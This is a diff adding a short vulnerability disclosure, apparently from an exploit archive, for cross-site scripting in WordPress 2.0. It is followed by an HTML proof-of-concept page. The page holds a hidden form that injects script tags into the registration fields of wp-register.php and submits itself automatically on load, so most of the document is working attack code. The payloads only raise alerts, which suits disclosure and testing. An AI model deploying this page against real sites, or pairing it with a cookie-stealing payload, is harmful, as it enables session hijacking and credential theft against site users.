@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/25769/info
+
+WordPress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+This issue affects WordPress 2.0; other versions may also be affected. 
+
+<html>
+<head></head>
+<body>
+
+<form method="post" action="http://target/wordpress/wp-register.php" >
+<input type="hidden" name="action" value="register" />
+<input type="hidden" name="user_login" id="user_login"
+value='"><script>alert(1)</script>' />
+<input type="hidden" name="user_email" id="user_email"
+value='"><script>alert(2)</script>' />
+</form>
+<script>document.forms[0].submit()</script>
+</body>
+</html>
